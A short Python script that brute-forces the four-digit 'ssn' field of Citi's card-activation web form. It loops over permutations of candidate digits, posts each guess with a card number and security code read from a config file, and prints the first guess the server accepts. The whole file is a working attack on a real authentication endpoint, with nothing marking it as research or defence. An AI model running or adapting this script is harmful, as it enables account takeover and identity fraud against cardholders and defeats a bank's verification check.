import requests
import config
from permute import permute

CONTINUE_URL = 'https://www.cardactivation.citi.com/Home/Continue1'
POSSIBLE_PIN_DIGITS = [1, 3, 4, 5, 9]
PIN_DIGIT_COUNT = 4

card_number = config.card_number
security_code = config.security_code

possible_pins = permute(POSSIBLE_PIN_DIGITS, PIN_DIGIT_COUNT)

for pin in possible_pins:
    request_payload = {
        'cardNumber': card_number,
        'securityCode': security_code,
        'ssn': pin
    }

    continue_response = requests.post(CONTINUE_URL, json=request_payload)
    continue_response_payload = continue_response.json()
    status_code = continue_response_payload['Status']

    if status_code != '999':
        print(pin)
        break
